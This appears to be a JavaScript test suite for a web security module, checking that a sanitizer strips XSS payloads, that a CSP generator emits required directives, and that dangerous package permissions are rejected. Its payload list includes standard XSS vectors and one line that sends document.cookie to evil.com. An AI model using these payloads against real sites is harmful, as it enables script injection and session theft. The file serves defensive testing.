import { Sanitizer } from '../../src/security/sanitizer.js';
import { ContentSecurityPolicy } from '../../src/security/content-security.js';
import { SecurityManager } from '../../src/security/security-manager.js';

describe('XSS Prevention', () => {
  let sanitizer;

  beforeEach(() => {
    sanitizer = new Sanitizer();
  });

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<svg onload="alert(1)">',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    'javascript:alert(document.cookie)',
    '<scr\0ipt>alert(1)</scr\0ipt>',
    '<!--><script>alert(1)</script>',
    '<<script>alert(1)</script>',
    '<script>fetch("https://evil.com/steal?"+document.cookie)</script>',
    '<div style="background:url(javascript:alert(1))">',
    '<math><style><!--</style><img src=x onerror=alert(1)>--></style></math>'
  ];

  test.each(xssPayloads)('should sanitize XSS payload: %s', (payload) => {
    const result = sanitizer.sanitize(payload);
    expect(result).not.toContain('javascript:');
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('onload');
    expect(result).not.toContain('onfocus');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('<SCRIPT');
  });

  test('should allow safe HTML through', () => {
    const safeHtml = '<p>Hello <strong>World</strong></p>';
    const result = sanitizer.sanitize(safeHtml);
    expect(result).toBe(safeHtml);
  });

  test('should allow safe links', () => {
    const safe = '<a href="https://example.com">Link</a>';
    const result = sanitizer.sanitize(safe);
    expect(result).toContain('https://example.com');
    expect(result).toContain('<a');
  });

  test('should allow images with safe sources', () => {
    const safe = '<img src="https://cdn.example.com/image.png" alt="safe">';
    const result = sanitizer.sanitize(safe);
    expect(result).toContain('src="https://cdn.example.com/image.png"');
  });
});

describe('Content Security Policy', () => {
  let csp;

  beforeEach(() => {
    csp = new ContentSecurityPolicy();
  });

  test('should block inline scripts by default in sandbox', () => {
    const policy = csp.generateForSandbox();
    expect(policy).toContain("'none'");
  });

  test('should include all required directives', () => {
    const policy = csp.generate();
    expect(policy).toContain('default-src');
    expect(policy).toContain('script-src');
    expect(policy).toContain('style-src');
    expect(policy).toContain('img-src');
    expect(policy).toContain('connect-src');
    expect(policy).toContain('media-src');
    expect(policy).toContain('frame-src');
    expect(policy).toContain('object-src');
    expect(policy).toContain('base-uri');
    expect(policy).toContain('form-action');
  });
});

describe('Package Security Validation', () => {
  test('should reject packages with dangerous permissions', () => {
    const sm = new SecurityManager();
    const dangerous = ['admin', 'root', 'shell', 'exec', 'system'];
    for (const perm of dangerous) {
      expect(() => sm.validatePermissionRequest(perm)).toThrow();
    }
  });

  test('should validate package integrity', () => {
    const sm = new SecurityManager();
    expect(() => sm.validatePackage(null)).toThrow();
    expect(() => sm.validatePackage({})).toThrow();
    expect(() => sm.validatePackage({ manifest: { id: 'test', version: 'bad', title: 'x' } })).toThrow();
  });
});
